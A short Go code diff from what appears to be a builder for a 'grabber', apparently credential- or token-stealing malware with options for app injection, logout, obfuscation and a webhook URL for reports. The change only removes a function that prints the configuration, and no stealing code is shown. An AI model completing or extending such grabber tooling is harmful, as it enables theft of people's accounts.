@@ -30,18 +30,6 @@ type Config struct {
 	EmbedColor    string   `json:"embed-color"`
 }
 
-func init() {
-	cfg = loadConfig("config.json")
-	Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Obfuscate (WARNING: experimental, always test it before using the grabber, we won't fix bugs you had if you used obfuscation :Instant feature may break often): %s Logout: %s Disable-qr-code: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
-		fmt.Sprint(cfg.Platform)+"\n",
-		fmt.Sprint(cfg.Obfuscate)+"\n",
-		cfg.Logout+"\n",
-		cfg.DisableQrCode+"\n",
-		cfg.InjectNotify+"\n",
-		cfg.LogoutNotify+"\n",
-		cfg.InitNotify+"\n",
-		cfg.EmbedColor+"\n"))
-}
 func main() {
 	Info("Enter Webhook URL:")
 	fmt.Scanln(&webhook)
